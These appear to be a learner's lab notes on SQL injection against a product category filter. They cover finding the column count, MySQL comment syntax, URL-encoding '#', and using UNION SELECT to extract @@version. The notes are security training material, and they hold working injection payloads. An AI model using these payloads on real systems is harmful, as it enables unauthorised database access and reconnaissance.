LAB 08 - SQL injection attack, querying the database type and version on MySQL and Microsoft

SQL Injection - Product category filter

End Goal - Display the database version string

Analysis:

1. Find # of columns in product category table
' ORDER BY 1-- // internal server error... weird. Let's try a different comment
' ORDER BY 1# // works (in Burp Suite)... this must be MySQL because MySQL uses # as comments

NOTE: Entering the sqli payload ' ORDER BY 1# seems to not work in the browser anymore...
We need to do it in Burp Suite repeater (make sure to Ctrl+U to encode it as well...)
See images 08-browser-payload-fail and 08-burp-repeater-success for visual explanation

NOTE: Nevermind. It's because it thinks "#" is a reference to a location on the page.
The encoded version of the symbol "#" is "%23"

NOTE: The browser uses UTF-8 encoding, Burp Suite GET requests use URL encoding.
It seems like Burp Suite accepts "#" as well too though... Read more on this later.

2. Figure out which columns contain text
' UNION SELECT 'a','a'#
-> both columns contain text

3. Output the DB version
' UNION SELECT @@version, NULL#
' UNION SELECT @@version, NULL%23
